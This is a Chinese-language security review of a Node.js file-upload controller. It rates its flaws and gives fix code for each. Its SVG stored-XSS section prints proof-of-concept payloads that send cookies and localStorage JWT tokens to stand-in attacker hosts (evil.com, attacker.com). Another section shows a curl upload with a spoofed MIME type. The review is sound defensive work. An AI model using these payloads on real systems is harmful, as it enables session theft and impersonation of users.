# apis/controller/upload.controller.ts — 代码安全专家评审报告

**评审日期**: 2026-05-24
**评审角色**: 代码安全专家（OWASP Top 10 / CWE / 文件上传攻击面 / 注入 / 信息泄露 / 访问控制）
**文件路径**: `apis/controller/upload.controller.ts`
**代码行数**: 64 行
**关联文件**: `apis/app.ts`, `apis/utils/response.util.ts`, `apis/middleware/auth.middleware.ts`, `apis/middleware/rate-limit.middleware.ts`
**安全评级**: 🔴 HIGH RISK — 3 个 HIGH / 3 个 MEDIUM / 2 个 LOW
**攻击面分类**: 文件上传（OWASP A04:2021 Insecure Design）

---

## 一、安全评估总览

```
┌─────────────────────────────────────────────────────────┐
│  攻击面矩阵                                              │
│                                                          │
│  客户端 ──[HTTP POST]──▶ multer fileFilter ──▶ diskStorage ──▶ /uploads/ │
│           │                   │                  │              │
│           │              MIME 白名单         UUID 重命名     静态服务      │
│           │              (可伪造)           (防遍历)       (无安全头)     │
│           │                   │                  │              │
│           ▼                   ▼                  ▼              ▼
│       文件大小限制        SVG XSS 风险     扩展名未净化    Content-Type   │
│       (10MB)            (HIGH-1)         (LOW-1)        无校验(M-2)    │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

| 安全维度 | 评分 | OWASP 映射 |
|----------|------|------------|
| 输入验证 | 4/10 | A04:2021 Insecure Design |
| 文件上传安全 | 3/10 | A04:2021 Insecure Design |
| 错误处理安全 | 3/10 | A05:2021 Security Misconfiguration |
| 访问控制 | 7/10 | A01:2021 Broken Access Control |
| 信息泄露防护 | 3/10 | A05:2021 Security Misconfiguration |
| 输出安全 | 4/10 | A03:2021 Injection (Stored XSS) |

---

## 二、安全漏洞清单

### 🔴 HIGH-1: SVG 存储型 XSS — 可窃取管理员 JWT Token

**CWE**: CWE-79 (Cross-site Scripting) / CWE-434 (Unrestricted Upload)
**OWASP**: A03:2021 Injection / A04:2021 Insecure Design
**CVSS 3.1 估算**: 7.1 (AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N)

**位置**: 第 13 行

```typescript
const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'image/svg+xml'];
//                                                                       ^^^^^^^^^^^^^^^^
```

**攻击链**:

```
1. 攻击者（需 admin/sysadmin 权限）上传恶意 SVG:
   ── payload.svg ──
   <svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://evil.com/steal?c='+document.cookie)">
   ─────────────────

2. 服务端通过 MIME 检查: Content-Type: image/svg+xml ✓
3. 文件保存为 /uploads/<uuid>.svg
4. 攻击者在文章/页面中嵌入图片 URL
5. 任意用户访问该页面 → 浏览器加载 SVG → JavaScript 执行
6. JWT Token 被发送到攻击者控制的服务器
7. 攻击者使用窃取的 Token 伪造身份
```

**利用条件**: 需要上传权限（sysadmin/admin），但 **影响范围是所有用户**

**PoC — 更隐蔽的攻击向量**:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <desc>
    <script type="text/javascript">
      // 利用 fetch API 静默窃取 token
      var token = localStorage.getItem('token');
      var user = localStorage.getItem('user');
      new Image().src = 'https://attacker.com/collect?t=' + encodeURIComponent(token) + '&u=' + encodeURIComponent(user);
    </script>
  </desc>
</svg>
```

**修复方案**（三选一，推荐方案 A）:

**方案 A — 移除 SVG 支持（零风险，推荐）**:
```typescript
const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
```

**方案 B — 服务端 SVG 净化**:
```typescript
import DOMPurify from 'isomorphic-dompurify';

// 在 uploadFile 中添加
if (req.file.mimetype === 'image/svg+xml') {
  const raw = fs.readFileSync(req.file.path, 'utf-8');
  const clean = DOMPurify.sanitize(raw, {
    USE_PROFILES: { svg: true, svgFilters: true },
    FORBID_TAGS: ['script', 'iframe', 'object', 'embed'],
    FORBID_ATTR: ['onload', 'onclick', 'onerror', 'onmouseover'],
  });
  if (clean !== raw) {
    fs.unlinkSync(req.file.path); // 删除不安全的文件
    fail(res, 400, 'SVG 文件包含不安全内容');
    return;
  }
}
```

**方案 C — 静态文件服务层配置安全头**（缓解，不根除）:
```typescript
// 在 app.ts 中为 /uploads 路由添加
app.use('/uploads', express.static(UPLOAD_DIR, {
  setHeaders: (res) => {
    res.setHeader('Content-Disposition', 'attachment'); // 强制下载而非渲染
    res.setHeader('Content-Security-Policy', "default-src 'none'"); // 禁止脚本执行
    res.setHeader('X-Content-Type-Options', 'nosniff'); // 防止 MIME 嗅探
  }
}));
```

---

### 🔴 HIGH-2: MIME 类型伪造 — 可上传任意文件

**CWE**: CWE-434 (Unrestricted Upload of File with Dangerous Type)
**OWASP**: A04:2021 Insecure Design

**位置**: 第 33-38 行

```typescript
fileFilter: (_req, file, cb) => {
  if (ALLOWED_TYPES.includes(file.mimetype)) {
    cb(null, true);   // ← 仅信任客户端声明的 Content-Type
  }
```

**攻击向量**:

```bash
# 攻击者使用 curl 伪造 MIME 类型上传 HTML 文件（含 JS）
curl -X POST http://target/api/upload \
  -H "Authorization: Bearer <admin-jwt>" \
  -H "User-Agent: Mozilla/5.0" \
  -F "file=@malicious.html;type=image/png"
  #                     ^^^^^^^^^^^^^^
  #                     MIME 伪造为 image/png

# 服务端: file.mimetype === 'image/png' → 通过 ✓
# 实际保存: /uploads/<uuid>.html（如果 originalname 是 .html 结尾）
# 结果: 可通过 /uploads/<uuid>.html 在同源上下文执行任意 JS
```

**关键风险**: 如果攻击者控制 `originalname` 的扩展名（如 `malicious.html`），结合 MIME 伪造，可在同源服务器上部署 HTML 页面，绕过同源策略。

**修复方案 — Magic Bytes（文件签名）验证**:

```typescript
const FILE_SIGNATURES: Record<string, { offset: number; bytes: Buffer }> = {
  'image/jpeg': { offset: 0, bytes: Buffer.from([0xFF, 0xD8, 0xFF]) },
  'image/png':  { offset: 0, bytes: Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]) },
  'image/gif':  { offset: 0, bytes: Buffer.from([0x47, 0x49, 0x46, 0x38]) },  // GIF8
  'image/webp': { offset: 0, bytes: Buffer.from([0x52, 0x49, 0x46, 0x46]) },  // RIFF
};

function verifyFileSignature(filePath: string, mimetype: string): boolean {
  const sig = FILE_SIGNATURES[mimetype];
  if (!sig) return false; // 无已知签名 → 拒绝
  const fd = fs.openSync(filePath, 'r');
  const buf = Buffer.alloc(sig.bytes.length);
  fs.readSync(fd, buf, 0, sig.bytes.length, sig.offset);
  fs.closeSync(fd);
  return buf.equals(sig.bytes);
}

// 在 uploadFile 中调用
if (!verifyFileSignature(req.file.path, req.file.mimetype)) {
  fs.unlinkSync(req.file.path);
  fail(res, 400, '文件内容与声明类型不匹配');
  return;
}
```

---

### 🔴 HIGH-3: 错误信息泄露内部路径 + multer 异常未安全处理

**CWE**: CWE-209 (Generation of Error Message Containing Sensitive Information)
**OWASP**: A05:2021 Security Misconfiguration

**位置**: 第 44-46 行、第 61-62 行

```typescript
// 问题 1: err.message 直接返回客户端
upload.single('file')(req, res, (err: any) => {
  const status = err.message === '不支持的图片格式' ? 400 : 500;
  fail(res, status, err.message || '上传失败');  // ← 泄露内部错误
});

// 问题 2: catch 块同样泄露
} catch (err: any) {
  fail(res, 500, err.message || '上传失败');  // ← err.message 可能含 fs 路径
}
```

**泄露场景**:

| 触发条件 | err.message 内容示例 | 泄露信息 |
|----------|---------------------|----------|
| 磁盘满 | `"ENOSPC: no space left on device, open '/home/ubuntu/by/by_geo/uploads/xxx.png'"` | 服务器目录结构 |
| 权限错误 | `"EACCES: permission denied, open '/var/www/uploads/xxx.png'"` | 运行用户 + 路径 |
| multer 超限 | `"File too large"` | 不致命但返回 500 而非 413 |

**额外问题 — 魔法字符串判断**:
```typescript
err.message === '不支持的图片格式'  // ← 依赖中文文本匹配，脆弱
```
如果有人修改 `fileFilter` 中的错误消息文本，状态码逻辑会静默失效。

**修复方案**:

```typescript
import { MulterError } from 'multer';

// uploadMiddleware — 精确错误分类
upload.single('file')(req, res, (err: unknown) => {
  if (!err) { next(); return; }

  if (err instanceof MulterError) {
    // multer 特定错误
    if (err.code === 'LIMIT_FILE_SIZE') {
      fail(res, 413, '文件大小超过 10MB 限制');
    } else if (err.code === 'LIMIT_UNEXPECTED_FILE') {
      fail(res, 400, '上传字段名应为 file');
    } else {
      fail(res, 400, '上传参数错误');
    }
  } else if (err instanceof Error && err.message === '不支持的图片格式') {
    fail(res, 400, '不支持的图片格式');
  } else {
    // 所有其他错误 — 记录日志但不暴露细节
    console.error('Upload error:', err);
    fail(res, 500, '上传失败');
  }
});

// uploadFile — 同理
} catch (err: unknown) {
  console.error('Upload processing error:', err);
  fail(res, 500, '上传失败');
}
```

---

### 🟡 MEDIUM-1: 文件扩展名未净化 — 潜在双扩展名攻击

**CWE**: CWE-434 (Unrestricted Upload)
**位置**: 第 24 行

```typescript
const ext = path.extname(file.originalname);
cb(null, `${name}${ext}`);
```

**攻击场景**:

```
originalname: "avatar.php.png"  → ext = ".png"  → 安全（取最后一个 .）
originalname: ".htaccess"       → ext = ""       → 生成 uuid 无扩展名（无害）
originalname: "file.png%00.jpg" → ext = ".jpg"   → URL 编码问题
originalname: "file.tar.gz"     → ext = ".gz"    → 非图片扩展名
```

虽然 `path.extname` 取最后一个 `.` 后的内容，在大多数情况下安全，但：

1. 某些 Web 服务器（如 Apache 老版本）可能解析双扩展名 `file.php.png`
2. 非图片扩展名（`.gz`, `.zip`）可通过 MIME 伪造后保存

**修复方案 — 扩展名白名单映射**:

```typescript
const MIME_TO_EXT: Record<string, string> = {
  'image/jpeg': '.jpg',
  'image/png': '.png',
  'image/gif': '.gif',
  'image/webp': '.webp',
};

filename: (_req, file, cb) => {
  // 使用 MIME 映射的扩展名，而非信任客户端文件名
  const ext = MIME_TO_EXT[file.mimetype] || '.bin';
  const name = crypto.randomUUID();
  cb(null, `${name}${ext}`);
},
```

---

### 🟡 MEDIUM-2: 上传文件静态服务无安全响应头

**CWE**: CWE-693 (Protection Mechanism Failure)
**位置**: `app.ts` 中的静态文件服务配置（非本文件，但与本文件直接相关）

**问题分析**:

上传的文件通过 `/uploads/` 路径对外提供静态文件服务。如果 `app.ts` 中未配置以下安全头，所有上传文件将存在风险：

```
缺失头:
- X-Content-Type-Options: nosniff    → 浏览器可能将 .png 文件误解析为 HTML
- Content-Disposition: attachment     → SVG/HTML 文件将被浏览器直接渲染执行
- Content-Security-Policy             → 无 CSP 阻止内联脚本
- Cache-Control: no-store             → 敏感文件可能被 CDN/代理缓存
```

**修复方案 — 在 app.ts 中配置**:

```typescript
app.use('/uploads', express.static(UPLOAD_DIR, {
  setHeaders: (res, _filePath) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('Cache-Control', 'private, max-age=3600');
    // SVG 和 HTML 文件强制下载而非渲染
    const ext = path.extname(_filePath).toLowerCase();
    if (['.svg', '.html', '.htm'].includes(ext)) {
      res.setHeader('Content-Disposition', 'attachment');
      res.setHeader('Content-Security-Policy', "default-src 'none'; script-src 'none'");
    }
  }
}));
```

---

### 🟡 MEDIUM-3: 解压缩炸弹（Pixel Flood）攻击面未防护

**CWE**: CWE-400 (Uncontrolled Resource Consumption)
**位置**: 第 14 行

```typescript
const MAX_SIZE = 10 * 1024 * 1024; // 10MB 文件大小限制
```

**攻击向量**:

```
一个 10MB 的 PNG 文件可以解码为:
- 65535 x 65535 像素 × RGBA = ~16GB 内存占用
- 攻击者在后续业务流程中处理此图片时，可能导致服务器 OOM

一个合法的 1x1 像素 PNG 可以被压缩到极小体积:
- 文件大小: < 1KB（通过文件大小检查）
- 解压后: 可构造为声称巨大尺寸的图像
```

**影响**: 如果后续有图片处理逻辑（缩略图、裁剪、格式转换等），恶意图片可能导致内存耗尽。

**修复方案 — 图片尺寸验证**:

```typescript
import sizeOf from 'image-size';

// 在 uploadFile 中添加尺寸检查
const dimensions = sizeOf(req.file.path);
const MAX_DIMENSIONS = 8000; // 最大 8000x8000 像素
if (dimensions.width && dimensions.width > MAX_DIMENSIONS ||
    dimensions.height && dimensions.height > MAX_DIMENSIONS) {
  fs.unlinkSync(req.file.path);
  fail(res, 400, '图片尺寸超过限制');
  return;
}
```

---

### 🔵 LOW-1: TOCTOU 竞态条件

**CWE**: CWE-367 (Time-of-check Time-of-use Race Condition)
**位置**: 第 8-11 行、第 17-19 行

```typescript
if (!fs.existsSync(UPLOAD_DIR)) {    // ← Check
  fs.mkdirSync(UPLOAD_DIR, { recursive: true });  // ← Use
}
```

两个并发请求可能同时通过 `existsSync` 检查，虽然 `{ recursive: true }` 使 `mkdirSync` 不会因目录已存在而失败（Node.js 10.12+），因此实际风险较低。但重复检查（M-2 已指出）意味着代码逻辑本身不严谨。

**修复方案**: 直接调用 `fs.mkdirSync(dir, { recursive: true })` 不检查，或使用 `fs.promises.mkdir` 配合 `catch` 忽略 `EEXIST`。

---

### 🔵 LOW-2: 上传目录无 `.gitignore` — 可能意外提交用户上传文件

**位置**: 项目根目录 `.gitignore`

**问题**: 如果 `uploads/` 目录未在 `.gitignore` 中排除，用户上传的文件可能被提交到 Git 仓库，造成：
1. 仓库体积膨胀
2. 敏感文件泄露（如果仓库公开）

**修复方案**: 确认 `.gitignore` 包含 `uploads/` 目录。

---

## 三、安全防护现状（做得好的方面）

| 防护措施 | 实现情况 | 安全价值 |
|----------|---------|----------|
| UUID 文件命名 | ✅ `crypto.randomUUID()` | 有效防止路径遍历和文件名猜测 |
| 路由层认证 | ✅ `authMiddleware` | 非认证用户无法上传 |
| 路由层授权 | ✅ `roleMiddleware('sysadmin', 'admin')` | 仅管理员可上传 |
| User-Agent 检查 | ✅ `anti-crawl` 中间件 | 防止简单脚本攻击 |
| 速率限制 | ✅ `rate-limit` 中间件 | 防止暴力上传 |
| MIME 白名单 | ✅ 5 种类型 | 比黑名单更安全 |
| 文件大小限制 | ✅ 10MB | 防止大文件 DoS |
| JWT 认证 | ✅ Bearer Token | 防止未授权访问 |

---

## 四、攻击树（Attack Tree）

```
目标: 通过文件上传攻击系统
├── 1. 上传恶意文件执行代码
│   ├── 1.1 SVG 内嵌 JS (HIGH-1) ✓ 可行 → 存储型 XSS
│   ├── 1.2 MIME 伪造上传 HTML (HIGH-2) ✓ 可行 → 同源 JS 执行
│   ├── 1.3 双扩展名绕过 (MEDIUM-1) △ 条件性 → 需配合服务器配置缺陷
│   └── 1.4 服务器端代码执行 ✗ 不可行 → UUID 命名无路径遍历
│
├── 2. 拒绝服务
│   ├── 2.1 大文件上传 △ 缓解 → 10MB 限制 + 速率限制
│   ├── 2.2 解压炸弹 (MEDIUM-3) ✓ 可行 → 后续图片处理时 OOM
│   └── 2.3 大量上传填满磁盘 △ 缓解 → 需 admin 权限 + 速率限制
│
├── 3. 信息泄露
│   ├── 3.1 错误消息泄露路径 (HIGH-3) ✓ 可行 → fs 错误包含服务器路径
│   ├── 3.2 目录列表 ✗ 不可行 → express.static 默认禁用
│   └── 3.3 文件名枚举 △ 困难 → UUID v4 有 2^122 种可能
│
└── 4. 认证/授权绕过
    ├── 4.1 无 Token 上传 ✗ 不可行 → authMiddleware 强制
    ├── 4.2 viewer 角色上传 ✗ 不可行 → roleMiddleware 限制
    └── 4.3 Token 过期后上传 ✗ 不可行 → JWT 验证包含过期检查
```

---

## 五、修复优先级与工作量

### P0 — 立即修复（今天）

| 编号 | 问题 | 工作量 | 修复方案 |
|------|------|--------|----------|
| H-1 | SVG XSS | 5 分钟 | 从 `ALLOWED_TYPES` 移除 `'image/svg+xml'` |
| H-3 | 错误信息泄露 | 30 分钟 | 使用 `instanceof MulterError` 分类 + 通用错误消息 |

### P1 — 本周修复

| 编号 | 问题 | 工作量 | 修复方案 |
|------|------|--------|----------|
| H-2 | MIME 伪造 | 2 小时 | 添加 Magic Bytes 文件签名验证 |
| M-1 | 扩展名未净化 | 30 分钟 | MIME → 扩展名映射表 |
| M-2 | 静态服务无安全头 | 30 分钟 | `app.ts` 中配置安全响应头 |

### P2 — 下个迭代

| 编号 | 问题 | 工作量 | 修复方案 |
|------|------|--------|----------|
| M-3 | 解压炸弹 | 1 小时 | 添加图片尺寸验证（如使用 `image-size`） |

---

## 六、安全基线对标

| 安全标准 | 要求 | 当前状态 | 差距 |
|----------|------|---------|------|
| OWASP A03 (Injection) | 防止 XSS | ❌ SVG 可内嵌 JS | 移除 SVG 或净化 |
| OWASP A04 (Insecure Design) | 文件内容验证 | ❌ 仅验证 MIME | 添加 Magic Bytes |
| OWASP A05 (Security Misconfiguration) | 不泄露内部信息 | ❌ err.message 直接暴露 | 通用错误消息 |
| CWE-434 (Unrestricted Upload) | 验证文件类型 | ⚠️ 部分 | 内容验证 + 扩展名净化 |
| CWE-79 (XSS) | 输出编码 | ❌ SVG 无输出控制 | CSP / 移除 SVG |
| CWE-209 (Information Exposure) | 安全错误处理 | ❌ 内部路径泄露 | MulterError 分类 |
| CWE-400 (Resource Exhaustion) | 限制资源消耗 | ⚠️ 文件大小有限 | 添加像素尺寸限制 |

---

## 七、评审结论

**判定: 🔴 HIGH RISK — 存在可利用的安全漏洞，建议立即修复 HIGH 级别问题**

**核心风险**:

1. **SVG 存储型 XSS (H-1)** — 修复成本最低（删除一行），风险最高（可窃取管理员 Token）
2. **MIME 伪造 (H-2)** — 攻击者可上传任意内容，绕过类型检查
3. **错误信息泄露 (H-3)** — 暴露服务器内部结构信息

**防御纵深建议**（多层防护）:

```
Layer 1: 认证 + 授权        ← 已实现 ✓
Layer 2: MIME 白名单         ← 已实现，但可伪造 ✗
Layer 3: 文件签名验证        ← 未实现，建议添加
Layer 4: 扩展名净化          ← 未实现，建议添加
Layer 5: 图片尺寸限制        ← 未实现，建议添加
Layer 6: 安全响应头          ← 未实现，建议添加
Layer 7: 文件内容扫描        ← 未实现，长期考虑
```

**最低修复要求**: 完成全部 HIGH 级别修复后，安全评级可提升至 🟡 MEDIUM RISK。

---

*代码安全专家评审完成 — 2026-05-24*
